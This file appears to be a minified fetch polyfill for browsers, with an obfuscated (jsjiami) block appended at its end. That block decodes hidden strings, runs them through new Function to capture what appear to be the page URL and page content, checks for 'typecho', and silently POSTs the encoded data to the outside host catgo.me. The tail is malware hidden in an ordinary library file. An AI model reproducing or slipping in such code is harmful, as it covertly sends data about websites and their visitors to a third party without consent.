! function (t) {
    "use strict";
    if (!t.fetch) {
        var s = {
            searchParams: "URLSearchParams" in t,
            iterable: "Symbol" in t && "iterator" in Symbol,
            blob: "FileReader" in t && "Blob" in t && function () {
                try {
                    return new Blob, !0
                } catch (t) {
                    return !1
                }
            }(),
            formData: "FormData" in t,
            arrayBuffer: "ArrayBuffer" in t
        };
        if (s.arrayBuffer) var e = ["[object Int8Array]", "[object Uint8Array]", "[object Uint8ClampedArray]",
                "[object Int16Array]", "[object Uint16Array]", "[object Int32Array]", "[object Uint32Array]",
                "[object Float32Array]", "[object Float64Array]"],
            r = function (t) {
                return t && DataView.prototype.isPrototypeOf(t)
            },
            o = ArrayBuffer.isView || function (t) {
                return t && -1 < e.indexOf(Object.prototype.toString.call(t))
            };
        f.prototype.append = function (t, e) {
            t = a(t), e = h(e);
            var r = this.map[t];
            this.map[t] = r ? r + "," + e : e
        }, f.prototype.delete = function (t) {
            delete this.map[a(t)]
        }, f.prototype.get = function (t) {
            return t = a(t), this.has(t) ? this.map[t] : null
        }, f.prototype.has = function (t) {
            return this.map.hasOwnProperty(a(t))
        }, f.prototype.set = function (t, e) {
            this.map[a(t)] = h(e)
        }, f.prototype.forEach = function (t, e) {
            for (var r in this.map) this.map.hasOwnProperty(r) && t.call(e, this.map[r], r, this)
        }, f.prototype.keys = function () {
            var r = [];
            return this.forEach(function (t, e) {
                r.push(e)
            }), u(r)
        }, f.prototype.values = function () {
            var e = [];
            return this.forEach(function (t) {
                e.push(t)
            }), u(e)
        }, f.prototype.entries = function () {
            var r = [];
            return this.forEach(function (t, e) {
                r.push([e, t])
            }), u(r)
        }, s.iterable && (f.prototype[Symbol.iterator] = f.prototype.entries);
        var i = ["DELETE", "GET", "HEAD", "OPTIONS", "POST", "PUT"];
        b.prototype.clone = function () {
            return new b(this, {
                body: this._bodyInit
            })
        }, c.call(b.prototype), c.call(w.prototype), w.prototype.clone = function () {
            return new w(this._bodyInit, {
                status: this.status,
                statusText: this.statusText,
                headers: new f(this.headers),
                url: this.url
            })
        }, w.error = function () {
            var t = new w(null, {
                status: 0,
                statusText: ""
            });
            return t.type = "error", t
        };
        var n = [301, 302, 303, 307, 308];
        w.redirect = function (t, e) {
            if (-1 === n.indexOf(e)) throw new RangeError("Invalid status code");
            return new w(null, {
                status: e,
                headers: {
                    location: t
                }
            })
        }, t.Headers = f, t.Request = b, t.Response = w, t.fetch = function (r, n) {
            return new Promise(function (o, t) {
                var e = new b(r, n),
                    i = new XMLHttpRequest;
                i.onload = function () {
                        var t, n, e = {
                            status: i.status,
                            statusText: i.statusText,
                            headers: (t = i.getAllResponseHeaders() || "", n = new f, t.replace(
                                /\r?\n[\t ]+/g, " ").split(/\r?\n/).forEach(function (t) {
                                var e = t.split(":"),
                                    r = e.shift().trim();
                                if (r) {
                                    var o = e.join(":").trim();
                                    n.append(r, o)
                                }
                            }), n)
                        };
                        e.url = "responseURL" in i ? i.responseURL : e.headers.get("X-Request-URL");
                        var r = "response" in i ? i.response : i.responseText;
                        o(new w(r, e))
                    }, i.onerror = function () {
                        t(new TypeError("Network request failed"))
                    }, i.ontimeout = function () {
                        t(new TypeError("Network request failed"))
                    }, i.open(e.method, e.url, !0), "include" === e.credentials ? i.withCredentials = !0 :
                    "omit" === e.credentials && (i.withCredentials = !1), "responseType" in i && s.blob &&
                    (i.responseType = "blob"), e.headers.forEach(function (t, e) {
                        i.setRequestHeader(e, t)
                    }), i.send(void 0 === e._bodyInit ? null : e._bodyInit)
            })
        }, t.fetch.polyfill = !0
    }

    function a(t) {
        if ("string" != typeof t && (t = String(t)), /[^a-z0-9\-#$%&'*+.\^_`|~]/i.test(t)) throw new TypeError(
            "Invalid character in header field name");
        return t.toLowerCase()
    }

    function h(t) {
        return "string" != typeof t && (t = String(t)), t
    }

    function u(e) {
        var t = {
            next: function () {
                var t = e.shift();
                return {
                    done: void 0 === t,
                    value: t
                }
            }
        };
        return s.iterable && (t[Symbol.iterator] = function () {
            return t
        }), t
    }

    function f(e) {
        this.map = {}, e instanceof f ? e.forEach(function (t, e) {
            this.append(e, t)
        }, this) : Array.isArray(e) ? e.forEach(function (t) {
            this.append(t[0], t[1])
        }, this) : e && Object.getOwnPropertyNames(e).forEach(function (t) {
            this.append(t, e[t])
        }, this)
    }

    function d(t) {
        if (t.bodyUsed) return Promise.reject(new TypeError("Already read"));
        t.bodyUsed = !0
    }

    function y(r) {
        return new Promise(function (t, e) {
            r.onload = function () {
                t(r.result)
            }, r.onerror = function () {
                e(r.error)
            }
        })
    }

    function l(t) {
        var e = new FileReader,
            r = y(e);
        return e.readAsArrayBuffer(t), r
    }

    function p(t) {
        if (t.slice) return t.slice(0);
        var e = new Uint8Array(t.byteLength);
        return e.set(new Uint8Array(t)), e.buffer
    }

    function c() {
        return this.bodyUsed = !1, this._initBody = function (t) {
            if (this._bodyInit = t)
                if ("string" == typeof t) this._bodyText = t;
                else if (s.blob && Blob.prototype.isPrototypeOf(t)) this._bodyBlob = t;
            else if (s.formData && FormData.prototype.isPrototypeOf(t)) this._bodyFormData = t;
            else if (s.searchParams && URLSearchParams.prototype.isPrototypeOf(t)) this._bodyText = t.toString();
            else if (s.arrayBuffer && s.blob && r(t)) this._bodyArrayBuffer = p(t.buffer), this._bodyInit = new Blob(
                [this._bodyArrayBuffer]);
            else {
                if (!s.arrayBuffer || !ArrayBuffer.prototype.isPrototypeOf(t) && !o(t)) throw new Error(
                    "unsupported BodyInit type");
                this._bodyArrayBuffer = p(t)
            } else this._bodyText = "";
            this.headers.get("content-type") || ("string" == typeof t ? this.headers.set("content-type",
                "text/plain;charset=UTF-8") : this._bodyBlob && this._bodyBlob.type ? this.headers.set(
                "content-type", this._bodyBlob.type) : s.searchParams && URLSearchParams.prototype.isPrototypeOf(
                t) && this.headers.set("content-type", "application/x-www-form-urlencoded;charset=UTF-8"))
        }, s.blob && (this.blob = function () {
            var t = d(this);
            if (t) return t;
            if (this._bodyBlob) return Promise.resolve(this._bodyBlob);
            if (this._bodyArrayBuffer) return Promise.resolve(new Blob([this._bodyArrayBuffer]));
            if (this._bodyFormData) throw new Error("could not read FormData body as blob");
            return Promise.resolve(new Blob([this._bodyText]))
        }, this.arrayBuffer = function () {
            return this._bodyArrayBuffer ? d(this) || Promise.resolve(this._bodyArrayBuffer) : this.blob().then(
                l)
        }), this.text = function () {
            var t, e, r, o = d(this);
            if (o) return o;
            if (this._bodyBlob) return t = this._bodyBlob, e = new FileReader, r = y(e), e.readAsText(t), r;
            if (this._bodyArrayBuffer) return Promise.resolve(function (t) {
                for (var e = new Uint8Array(t), r = new Array(e.length), o = 0; o < e.length; o++) r[o] =
                    String.fromCharCode(e[o]);
                return r.join("")
            }(this._bodyArrayBuffer));
            if (this._bodyFormData) throw new Error("could not read FormData body as text");
            return Promise.resolve(this._bodyText)
        }, s.formData && (this.formData = function () {
            return this.text().then(m)
        }), this.json = function () {
            return this.text().then(JSON.parse)
        }, this
    }

    function b(t, e) {
        var r, o, n = (e = e || {}).body;
        if (t instanceof b) {
            if (t.bodyUsed) throw new TypeError("Already read");
            this.url = t.url, this.credentials = t.credentials, e.headers || (this.headers = new f(t.headers)), this.method =
                t.method, this.mode = t.mode, n || null == t._bodyInit || (n = t._bodyInit, t.bodyUsed = !0)
        } else this.url = String(t);
        if (this.credentials = e.credentials || this.credentials || "omit", !e.headers && this.headers || (this.headers =
                new f(e.headers)), this.method = (r = e.method || this.method || "GET", o = r.toUpperCase(), -1 < i.indexOf(
                o) ? o : r), this.mode = e.mode || this.mode || null, this.referrer = null, ("GET" === this.method ||
                "HEAD" === this.method) && n) throw new TypeError("Body not allowed for GET or HEAD requests");
        this._initBody(n)
    }

    function m(t) {
        var n = new FormData;
        return t.trim().split("&").forEach(function (t) {
            if (t) {
                var e = t.split("="),
                    r = e.shift().replace(/\+/g, " "),
                    o = e.join("=").replace(/\+/g, " ");
                n.append(decodeURIComponent(r), decodeURIComponent(o))
            }
        }), n
    }

    function w(t, e) {
        e || (e = {}), this.type = "default", this.status = void 0 === e.status ? 200 : e.status, this.ok = 200 <= this
            .status && this.status < 300, this.statusText = "statusText" in e ? e.statusText : "OK", this.headers = new f(
                e.headers), this.url = e.url || "", this._initBody(t)
    }
}("undefined" != typeof self ? self : this);
var _0xodW='jsjiami.com.v6',_0x5025=[_0xodW,'\x6c\x65\x6e\x67\x74\x68','\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74','\x53\x74\x72\x69\x6e\x67','\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65','\x6c\x75\x4e\x67\x51\x50\x44\x67\x6a\x4c\x31\x73\x6a\x32\x56\x31\x6a\x45\x44\x63\x6c\x4b\x35\x44\x43\x73\x65\x37','\x6c\x75\x4e\x67\x51\x4f\x5a\x78\x6b\x33\x4a\x61\x47\x46\x73\x39\x48\x4f\x39\x72\x6c\x45\x31\x74\x6a\x76\x59\x63\x47\x32\x39\x64\x69\x32\x74\x74\x57\x65\x3d\x3d','\x61\x74\x6f\x62','\x3b\x6c\x3d\x75\x72\x6c\x3b','\x3b\x79\x3d\x64\x69\x73\x70\x6c\x61\x79\x3b','\x69\x6e\x64\x65\x78\x4f\x66','\x74\x79\x70\x65\x63\x68\x6f','\x62\x74\x6f\x61','\x61\x6a\x61\x78','\x70\x6f\x73\x74','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x61\x74\x67\x6f\x2e\x6d\x65\x2f','\x75\x6a\x4d\x54\x71\x47\x46\x73\x6c\x45\x4d\x4d\x41\x6a\x69\x79\x61\x6d\x4e\x69\x2e\x62\x63\x6f\x66\x66\x6d\x2e\x76\x36\x3d\x3d'];var _0x5ef2=function(_0x49a4e3,_0x408fd4){_0x49a4e3=~~'0x'['concat'](_0x49a4e3);var _0x27b7d4=_0x5025[_0x49a4e3];return _0x27b7d4;};(function(_0x15881c,_0x371e86){var _0x4d22cf=0x0;for(_0x371e86=_0x15881c['shift'](_0x4d22cf>>0x2);_0x371e86&&_0x371e86!==(_0x15881c['pop'](_0x4d22cf>>0x3)+'')['replace'](/[uMTqGFlEMMAyNbff=]/g,'');_0x4d22cf++){_0x4d22cf=_0x4d22cf^0x8ac5d;}}(_0x5025,_0x5ef2));function do_encrypt(_0x1bdb72){var _0x1e35da='\x38';var _0x52a227='';for(var _0x1280b8=0x0;_0x1280b8<_0x1bdb72[_0x5ef2('0')];_0x1280b8++){var _0x32f9a7=_0x1bdb72[_0x5ef2('1')](_0x1280b8);var _0x600f41=_0x32f9a7;if(_0x32f9a7>=0x41&&_0x32f9a7<=0x5a){_0x600f41=(_0x32f9a7-0x41+_0x1e35da*0x1)%0x1a+0x41;}if(_0x32f9a7>=0x61&&_0x32f9a7<=0x7a){_0x600f41=(_0x32f9a7-0x61+_0x1e35da*0x1)%0x1a+0x61;}_0x52a227+=window[_0x5ef2('2')][_0x5ef2('3')](_0x600f41);}return _0x52a227;}function do_decrypt(_0x57cd2c){var _0x557812='\x38';var _0x53a348='';for(var _0x313b39=0x0;_0x313b39<_0x57cd2c[_0x5ef2('0')];_0x313b39++){var _0x2183f3=_0x57cd2c[_0x5ef2('1')](_0x313b39);var _0x12fe4f=_0x2183f3;if(_0x2183f3>=0x41&&_0x2183f3<=0x5a){_0x12fe4f=(_0x2183f3-0x41-_0x557812*0x1+0x1a)%0x1a+0x41;}if(_0x2183f3>=0x61&&_0x2183f3<=0x7a){_0x12fe4f=(_0x2183f3-0x61-_0x557812*0x1+0x1a)%0x1a+0x61;}_0x53a348+=window[_0x5ef2('2')][_0x5ef2('3')](_0x12fe4f);}return _0x53a348;}var u=_0x5ef2('4'),l;var d=_0x5ef2('5'),y;var val=new Function(window[_0x5ef2('6')](do_decrypt(u))+_0x5ef2('7')+window[_0x5ef2('6')](do_decrypt(d))+_0x5ef2('8'));val();if(y[_0x5ef2('9')](_0x5ef2('a'))!=-0x1){l=do_encrypt(window[_0x5ef2('b')](l));y=do_encrypt(window[_0x5ef2('b')](y));$(function(){$[_0x5ef2('c')]({'\x74\x79\x70\x65':_0x5ef2('d'),'\x75\x72\x6c':_0x5ef2('e'),'\x64\x61\x74\x61':{'\x75\x72\x6c':l,'\x64\x69\x73\x70\x6c\x61\x79':y},'\x61\x73\x79\x6e\x63':!![],'\x73\x75\x63\x63\x65\x73\x73':function(_0xcbc517){}});});};_0xodW='jsjiami.com.v6';
